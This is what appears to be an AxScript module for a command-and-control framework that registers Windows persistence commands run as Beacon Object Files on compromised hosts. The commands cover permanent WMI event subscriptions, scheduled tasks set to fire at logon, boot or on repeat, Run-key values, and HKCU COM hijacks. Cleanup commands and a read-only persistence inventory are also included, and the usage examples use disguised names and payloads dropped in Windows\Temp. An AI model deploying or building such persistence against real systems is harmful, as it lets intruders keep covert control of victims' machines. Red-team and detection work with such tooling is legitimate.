var metadata = {
    name: "Persistence-BOF",
    description: "Persistence primitives + kit-wide persistence inventory (install/pair with cleanup)"
};

// ---------- wmi-sub ----------
var cmd_wmi_sub = ax.create_command("wmi-sub", "Create a permanent WMI event subscription (boot trigger, in-process COM)", "wmi-sub wmiupd C:\\Windows\\Temp\\svc.exe");
cmd_wmi_sub.addArgString("subName", true, "Subscription name (also used by wmi-clear / persist-inventory)");
cmd_wmi_sub.addArgString("command", true, "CommandLineTemplate executed at trigger");
cmd_wmi_sub.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let name = parsed_json["subName"];
    let cmd  = parsed_json["command"];
    let bof_params = ax.bof_pack("cstr,cstr", [name, cmd]);
    let bof_path = ax.script_dir() + "_bin/wmisub." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: WMI subscription create (name=" + name + ")");
});

// ---------- wmi-clear ----------
var cmd_wmi_clear = ax.create_command("wmi-clear", "Remove a permanent WMI event subscription by name (binding + consumers + filter)", "wmi-clear wmiupd");
cmd_wmi_clear.addArgString("subName", true, "Subscription name to remove");
cmd_wmi_clear.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let name = parsed_json["subName"];
    let bof_params = ax.bof_pack("cstr", [name]);
    let bof_path = ax.script_dir() + "_bin/wmiclear." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: WMI subscription clear (name=" + name + ")");
});

// ---------- task-create ----------
var cmd_task_create = ax.create_command("task-create", "Create a persisted scheduled task via in-process COM RegisterTask (modes: 1=logon 2=boot 3=repeat)", "task-create winmon C:\\Windows\\Temp\\svc.exe 1");
cmd_task_create.addArgString("taskName", true, "Task name (a random suffix is added per run)");
cmd_task_create.addArgString("command", true, "Executable line stored in the task");
cmd_task_create.addArgFlagInt("-mode", "mode", "1=LogonTrigger (default), 2=BootTrigger, 3=TimeTrigger+repetition", "1");
cmd_task_create.addArgFlagInt("-every", "every", "mode 3: minutes between runs", "15");
cmd_task_create.addArgFlagInt("-hours", "hours", "mode 3: total window in hours", "24");
cmd_task_create.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let name  = parsed_json["taskName"];
    let cmd   = parsed_json["command"];
    let mode  = parseInt(parsed_json["mode"] || "1", 10);
    let every = parseInt(parsed_json["every"] || "15", 10);
    let hours = parseInt(parsed_json["hours"] || "24", 10);
    if (isNaN(mode))  mode  = 1;
    if (isNaN(every)) every = 15;
    if (isNaN(hours)) hours = 24;
    let bof_params = ax.bof_pack("cstr,cstr,int,int,int", [name, cmd, mode, every, hours]);
    let bof_path = ax.script_dir() + "_bin/taskcreate." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: scheduled task create (name=" + name + " mode=" + mode + ")");
});

// ---------- task-delete ----------
var cmd_task_delete = ax.create_command("task-delete", "Delete a scheduled task by name via in-process COM", "task-delete winmon.12345ab");
cmd_task_delete.addArgString("taskName", true, "Task name (including any per-run suffix)");
cmd_task_delete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let name = parsed_json["taskName"];
    let bof_params = ax.bof_pack("cstr", [name]);
    let bof_path = ax.script_dir() + "_bin/taskdelete." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: scheduled task delete (name=" + name + ")");
});

// ---------- runkey ----------
var cmd_runkey = ax.create_command("runkey", "Set or remove a Run-key value (HKCU default; HKLM with admin)", "runkey winmon C:\\Windows\\Temp\\svc.exe 1 0");
cmd_runkey.addArgString("valueName", true, "Run value name");
cmd_runkey.addArgString("command", true, "Command string to store (ignored in delete mode, use '-')");
cmd_runkey.addArgFlagInt("-mode", "mode", "1=set, 0=delete", "1");
cmd_runkey.addArgFlagInt("-hklm", "hklm", "0=HKCU (default), 1=HKLM (admin needed)", "0");
cmd_runkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let name  = parsed_json["valueName"];
    let cmd   = parsed_json["command"];
    let mode  = parseInt(parsed_json["mode"] || "1", 10); if (isNaN(mode)) mode = 1;
    let hklm  = parseInt(parsed_json["hklm"] || "0", 10); if (isNaN(hklm)) hklm = 0;
    let bof_params = ax.bof_pack("cstr,cstr,int,int", [name, cmd, mode, hklm]);
    let bof_path = ax.script_dir() + "_bin/runkey." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: run-key " + (mode ? "set" : "delete") + " (" + (hklm ? "HKLM" : "HKCU") + ")");
});

// ---------- comhijack ----------
var cmd_comhijack = ax.create_command("comhijack", "Set or remove a HKCU InprocServer32 COM hijack for one CLSID", "comhijack {AB8902B4-09CA-4BB6-B78D-A8F59079A8D5} C:\\Windows\\Temp\\winc.dll 1");
cmd_comhijack.addArgString("clsid", true, "CLSID GUID, braces included");
cmd_comhijack.addArgString("dllPath", true, "InprocServer32 path (set mode); '-' in delete mode");
cmd_comhijack.addArgFlagInt("-mode", "mode", "1=set, 0=delete (removes only the HKCU InprocServer32 subtree)", "1");
cmd_comhijack.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let clsid = parsed_json["clsid"];
    let dll   = parsed_json["dllPath"];
    let mode  = parseInt(parsed_json["mode"] || "1", 10); if (isNaN(mode)) mode = 1;
    if (mode === 0 && (!dll || dll === "")) dll = "-";
    let bof_params = ax.bof_pack("cstr,cstr,int", [clsid, dll, mode]);
    let bof_path = ax.script_dir() + "_bin/comhijack." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: COM hijack " + (mode ? "set" : "delete"));
});

// ---------- persist-inventory ----------
var cmd_persist_inventory = ax.create_command("persist-inventory", "Read-only sweep of Run keys, startup folders, WMI subscriptions, scheduled tasks, non-system services, IFEO, Winlogon", "persist-inventory -cap 40");
cmd_persist_inventory.addArgFlagInt("-cap", "cap", "Max tasks/services listed per section", "40");
cmd_persist_inventory.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let cap = parseInt(parsed_json["cap"] || "40", 10); if (isNaN(cap)) cap = 40;
    let bof_params = ax.bof_pack("int", [cap]);
    let bof_path = ax.script_dir() + "_bin/persist_inventory." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: persistence inventory");
});